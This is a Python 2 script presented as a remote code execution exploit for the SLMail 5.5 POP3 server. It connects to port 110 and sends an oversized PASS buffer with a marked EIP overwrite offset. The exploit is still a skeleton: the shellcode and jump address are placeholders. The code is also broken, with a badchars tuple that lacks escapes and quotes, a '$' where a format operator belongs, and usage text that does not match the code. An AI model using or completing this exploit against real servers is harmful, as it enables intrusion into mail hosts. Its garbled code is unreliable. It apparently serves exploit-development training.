#!/usr/bin/python

#####################################################################################
#______________________________SLMAIL 5.5 RCE Exploit________________________________
#__                                                                                __
#                      Author: WillChaos
#                      Usage: ./SLMailExploit.sh <ip> <port> <ID>
#
#                      ID's:
#                      [1] > win 7   | x86 | english
#                      [2] > win xp  | x86 | english
#                      [3] > win 2k3 | x86 | english
#--                                                                                 --
######################################################################################




# imports
import socket

# adjustable vars
addr_ip='192.168.10.26'
addr_port=110
uname='USER'

# bad chars
badchars = (
		    x00x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1f
                    x20x21x22x23x24x25x26x27x28x29x2ax2bx2cx2dx2ex2fx30x31x32x33x34x35x36x37x38x39x3ax3bx3cx3dx3ex3fx40
                    x41x42x43x44x45x46x47x48x49x4ax4bx4cx4dx4ex4fx50x51x52x53x54x55x56x57x58x59x5ax5bx5cx5dx5ex5f
                    x60x61x62x63x64x65x66x67x68x69x6ax6bx6cx6dx6ex6fx70x71x72x73x74x75x76x77x78x79x7ax7bx7cx7dx7ex7f
                    x80x81x82x83x84x85x86x87x88x89x8ax8bx8cx8dx8ex8fx90x91x92x93x94x95x96x97x98x99x9ax9bx9cx9dx9ex9f
                    xa0xa1xa2xa3xa4xa5xa6xa7xa8xa9xaaxabxacxadxaexafxb0xb1xb2xb3xb4xb5xb6xb7xb8xb9xbaxbbxbcxbdxbexbf
                    xc0xc1xc2xc3xc4xc5xc6xc7xc8xc9xcaxcbxccxcdxcexcfxd0xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdf
                    xe0xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff
            )
                                                                                                          # Totoal bytes for complete payload: 2700
                                                                                                          # offset: 2606 is EIP overwrite
#payload
totalBytes=2700                                                                                           # total bytes we can work with
headPadding="A" * 2606                                                                                    # padding before EIP overwrite
OVERWRITE="BBBB"                                                                                          # JMP ESP code (jump to our shell)
tailPadding="C" * (totalBytes - len(headPadding) - len(OVERWRITE))                                        # Fill left over bytes to complete the 2700
shellCode="D" * 8                                                                                         # Shellcode is dynamic here (but you are limited to X bytes)
espTailPadding= shellCode + ("C" * (len(tailPadding) - len(shellCode)))                                   # final TailPadding which includes the shell (start of ESP)

payload=headPadding + OVERWRITE + espTailPadding                                                          # Piece the payload together

print "--------------------------------------------------------------------------------------------------------"

# print confif info
print "_______________________________________INFO_&_CONFIG____________________________________________________"
print "Total payload byte length:    2700"
print "EIP overwrite located:        %s" % len(headPadding)
print "JMP>ESP overwrite selected:   %s" % OVERWRITE
print "ESP Padding length:           %s" % len(tailPadding)
print "Shell size (must fit in ESP): %s" % len(shellCode)
print "Total payload size:           %s" $ len(payload)
print "Scipt Author:                 WillChaos                                                                 "
print "________________________________________________________________________________________________________"
print "________________________________________________________________________________________________________"
# connect sock
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((addr_ip, addr_port))
print "[*] Opened new connection to: %s" % str(addr_ip)

# recv init banner
banner = s.recv(1024)
print "[RCV] Recieved connection banner: %s" % str(banner)

# send username
print "[SEND] Sending username: %s" % str(uname)
s.send('USER ' + uname + '\r\n') 

# recv uname response
resp = s.recv(1024)
print "[RCV] Recieved response: %s" % str(resp)

# send password + payload
print "[SEND] sending PASS + payload length: %s " % len(payload)
s.send('PASS ' + payload + '\r\n')

# recive response from pass + payload
resp2 = s.recv(1024)
print  "[RCV] Recieved reponse: %s" % str(resp2)

s.send('QUIT\r\n')

print "--------------------------------------------------------------------------------------------------------"


s.close()
